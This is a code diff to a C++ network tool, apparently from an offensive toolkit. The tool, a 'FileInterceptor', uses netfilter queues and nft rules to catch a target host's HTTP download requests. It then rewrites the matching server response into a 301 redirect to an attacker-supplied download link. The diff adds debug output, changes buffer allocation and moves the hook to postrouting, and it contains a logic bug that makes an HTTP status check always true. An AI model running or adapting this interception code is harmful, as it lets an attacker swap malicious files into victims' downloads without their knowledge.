@@ -60,8 +60,12 @@ static bool32 FilterTCPRes(tcphdr* tcpHeader, char* payload, uint32_t requestAck
     uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
     if(res == PC_HTTP_RESPONSE)
     {
-        if(tcpHeader->seq == requestAckNum)
-            return TRUE;
+        res = PacketCraft::GetHTTPMethod((uint8_t*)payload);
+        if(res == PC_HTTP_SUCCESS || PC_HTTP_REDIR)
+        {
+            if(tcpHeader->seq == requestAckNum)
+                return TRUE;
+        }
     }
     return FALSE;
 }
@@ -69,7 +73,8 @@ static bool32 FilterTCPRes(tcphdr* tcpHeader, char* payload, uint32_t requestAck
 static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buff* pkBuff, uint32_t matchOffset, uint32_t matchLen)
 {
     // create new payload
-    char httpResponse[1024]{};
+    char* httpResponse = (char*)malloc(matchLen);
+    memset(httpResponse, 0, matchLen);
     const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
     uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
     PacketCraft::ConcatStr(httpResponse, responseCodeLen, httpStatusCode, newDownloadLink);
@@ -79,8 +84,9 @@ static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buf
     {
         // NOTE: is the final argument (rep_size) correct? When trying to use the httpResponse string length it will
         // give a segmentation fault..
-        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, sizeof(httpResponse)) < 0)
+        if(nfq_tcp_mangle_ipv4(pkBuff, matchOffset, matchLen, httpResponse, matchLen) < 0)
         {
+            free(httpResponse);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
             return APPLICATION_ERROR;
         }
@@ -89,11 +95,13 @@ static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buf
     {
         if(nfq_tcp_mangle_ipv6(pkBuff, matchOffset, matchLen, httpResponse, responseCodeLen) < 0)
         {
+            free(httpResponse);
             LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv6() error");
             return APPLICATION_ERROR;
         }
     }
 
+    free(httpResponse);
     return NO_ERROR;
 }
 
@@ -106,7 +114,10 @@ static int ManglePacket(uint32_t ipVersion, const char* newDownloadLink, pkt_buf
     nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);
 
     if(pktb_mangled(pkBuff))
+    {
+        std::cout << "packet was mangled" << std::endl;
         nfq_nlmsg_verdict_put_pkt(nlh, pktb_data(pkBuff), pktb_len(pkBuff));
+    }
 
     nfq_nlmsg_verdict_put(nlh, id, NF_ACCEPT);
 
@@ -133,6 +144,7 @@ bool32 reqFiltered{FALSE};
 uint32_t reqAckNum{0};
 static int queueCallback(const nlmsghdr *nlh, void *data)
 {
+    std::cout << "--------------------\n";
     nfqnl_msg_packet_hdr* ph{nullptr};
     nlattr* attr[NFQA_MAX + 1]{};
     nfgenmsg*nfg{nullptr};
@@ -176,13 +188,15 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         return MNL_CB_ERROR;
     }
 
+    printf("packet received (id=%u hw=0x%04x hook=%u, payload len %u\n", ntohl(ph->packet_id), ntohs(ph->hw_protocol), ph->hook, plen);
+
     uint32_t ipVersion{};
     if(ntohs(ph->hw_protocol) == ETH_P_IP)
         ipVersion = AF_INET;
     else if(ntohs(ph->hw_protocol) == ETH_P_IPV6)
         ipVersion = AF_INET6;
 
-    pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 255);
+    pkt_buff* pkBuff = pktb_alloc(ipVersion, payload, plen, 4'096);
     if(pkBuff == nullptr)
     {
         LOG_ERROR(APPLICATION_ERROR, "pktb_alloc() error");
@@ -219,6 +233,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
                 inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
                 if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
                 {
+                    std::cout << "ip did not match\n";
                     if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                     {
                         pktb_free(pkBuff);
@@ -234,6 +249,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
                 inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
                 if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
                 {
+                    std::cout << "ip did not match\n";
                     if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                     {
                         pktb_free(pkBuff);
@@ -245,8 +261,9 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
             }
             //////////////////////////
         }
-        else    
+        else // no TCP layer in packet
         {
+            std::cout << "no tcp header in packet\n";
             if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
             {
                 pktb_free(pkBuff);
@@ -276,6 +293,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
                 inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
                 if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                 {
+                    std::cout << "ip6 did not match\n";
                     if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                     {
                         pktb_free(pkBuff);
@@ -291,6 +309,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
                 inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);  
                 if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                 {
+                    std::cout << "ip6 did not match\n";
                     if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
                     {
                         pktb_free(pkBuff);
@@ -304,6 +323,7 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         }
         else if(res < 0) // no TCP layer in packet
         {
+            std::cout << "no tcp header found in packet\n";
             if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
             {
                 pktb_free(pkBuff);
@@ -330,18 +350,14 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         return MNL_CB_ERROR;
     }
 
-    // payload len includes the header and options size, so we need to subtract those
     unsigned int tcpPayloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
-    if(tcpPayloadLen > 4 * tcpHeader->th_off)
-        tcpPayloadLen -= 4 * tcpHeader->th_off;
-    else
-        tcpPayloadLen = 0;
     
     if(reqFiltered == FALSE) // filter for the correct request and get its ack number
     {
         std::cout << "filtering request...\n";
         if(FilterTCPReq(callbackData.downloadLink, tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
         {
+            std::cout << "matching request filtered, id: " << ntohl(ph->packet_id) << "\n";
             reqFiltered = TRUE;
         }
     }
@@ -350,6 +366,8 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
         std::cout << "filtering response...\n";
         if(FilterTCPRes(tcpHeader, (char*)tcpPayload, reqAckNum) == TRUE)
         {
+            std::cout << "matching response filtered, id: " << ntohl(ph->packet_id) << "\n";
+
             char printBuf[1024]{};
 
             std::cout << printBuf << "\n-----------" << std::endl;
@@ -362,6 +380,8 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
             nfq_tcp_snprintf(printBuf, 1024, tcpHeader);
             std::cout << "tcp before mangling:\n";
             std::cout << printBuf << "\n-----------" << std::endl;
+
+            std::cout << "tcp payload len was " << tcpPayloadLen << std::endl;
 
             if(ManglePacket(ipVersion, callbackData.newDownloadLink, pkBuff, 4 * tcpHeader->th_off, tcpPayloadLen) == APPLICATION_ERROR)
             {
@@ -387,8 +407,6 @@ static int queueCallback(const nlmsghdr *nlh, void *data)
             reqAckNum = 0;
         }
     }
-
-    printf("packet received (id=%u hw=0x%04x hook=%u, payload len %u\n", ntohl(ph->packet_id), ntohs(ph->hw_protocol), ph->hook, plen);
 
     if(nfq_send_verdict(ntohs(nfg->res_id), ntohl(ph->packet_id), callbackData.nl, pkBuff) == APPLICATION_ERROR)
     {
@@ -452,7 +470,7 @@ int CHaks::FileInterceptor::Init(const uint32_t ipVersion, const char* interface
     memset(cmd, 0, CMD_LEN);
 
     // Add chain 1(postrouting) and rules to it
-    snprintf(cmd, CMD_LEN, "nft \'add chain %s %s %s { type filter hook input priority 0 ; }\'", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain1Name);
+    snprintf(cmd, CMD_LEN, "nft \'add chain %s %s %s { type filter hook postrouting priority 0 ; }\'", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain1Name);
     if(system(cmd) != 0)
     {
         LOG_ERROR(APPLICATION_ERROR, "system() error! failed to add chain1");
@@ -476,6 +494,7 @@ int CHaks::FileInterceptor::Init(const uint32_t ipVersion, const char* interface
     }
     //////////////////////////////////////
 
+/*
     // Add chain 2(prerouting) and rules to it
     snprintf(cmd, CMD_LEN, "nft \'add chain %s %s %s { type filter hook output priority 0 ; }\'", ipVersion == AF_INET ? "ip" : "ip6", tableName, chain2Name);
     if(system(cmd) != 0)
@@ -500,6 +519,7 @@ int CHaks::FileInterceptor::Init(const uint32_t ipVersion, const char* interface
         return APPLICATION_ERROR;
     }
     //////////////////////////////////////
+*/
 
     std::cout << "chains created:\n";
     system("nft list ruleset");
